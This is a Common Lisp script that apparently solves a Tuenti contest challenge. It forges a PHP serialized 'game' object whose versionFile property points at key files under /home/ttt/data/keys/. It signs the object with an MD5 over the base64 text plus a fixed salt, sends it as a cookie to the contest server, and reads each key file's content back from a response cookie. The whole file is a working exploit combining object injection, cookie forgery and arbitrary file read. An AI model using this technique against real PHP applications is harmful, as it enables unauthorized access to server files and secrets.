#!/usr/bin/sbcl --script

(let ((quicklisp-init (merge-pathnames "quicklisp/setup.lisp"
                                       (user-homedir-pathname))))
  (when (probe-file quicklisp-init)
    (load quicklisp-init)))

(with-output-to-string (*standard-output*)
  (require :sb-md5)
  (ql:quickload :drakma)
  (ql:quickload :cl-ppcre)
  (ql:quickload :s-base64))

(defun game-state (key)
  (cl-ppcre:regex-replace
   "SIZE"
   (cl-ppcre:regex-replace
    "KEYFILE"
    "O:4:\"game\":3:{s:11:\" game board\";O:5:\"board\":3:{s:12:\" board board\";a:3:{i:0;a:3:{i:0;b:0;i:1;b:0;i:2;b:0;}i:1;a:3:{i:0;b:0;i:1;b:0;i:2;b:0;}i:2;a:3:{i:0;b:0;i:1;b:0;i:2;b:0;}}s:13:\" board winner\";b:0;s:14:\" board winLine\";s:0:\"\";}s:15:\" game nextPiece\";s:1:\"X\";s:11:\"versionFile\";s:SIZE:\"/home/ttt/data/keys/KEYFILE\";}"
     key)
   (format nil "~d" (+ 20 (length key)))))

(defun code-content (content)
  (remove #\Newline
          (with-output-to-string (out)
            (s-base64:encode-base64-bytes (map 'vector #'char-code content) out))))

(defun cookie-content (key)
  (let* ((coded (code-content (game-state key)))
         (coded-byte-vector (map '(vector (unsigned-byte 8))
                                 #'char-code
                                 (concatenate 'string coded "IETN"))))
    (concatenate 'string coded
                 "|"
                 (format nil "~{~(~2,'0x~)~}"
                         (concatenate 'list (sb-md5:md5sum-sequence coded-byte-vector))))))

(defun http-request (cookie-jar)
  (drakma:http-request "http://ttt.contest.tuenti.net/" :cookie-jar cookie-jar))

(defun key-file (key)
  (let ((cookie-jar (make-instance
                     'drakma:cookie-jar
                     :cookies (list (make-instance
                                     'drakma:cookie
                                     :name "game"
                                     :value (cookie-content key)
                                     :domain "ttt.contest.tuenti.net")))))
    (http-request cookie-jar)
    (drakma:cookie-value (find "X-Tuenti-Powered-By"
                               (drakma:cookie-jar-cookies cookie-jar)
                               :key #'drakma:cookie-name
                               :test #'string=))))

(defun main ()
  (do ((line (read-line t nil 'eof) (read-line t nil 'eof)))
      ((eq line 'eof))
    (format t "~a~%" (key-file line))))

(main)
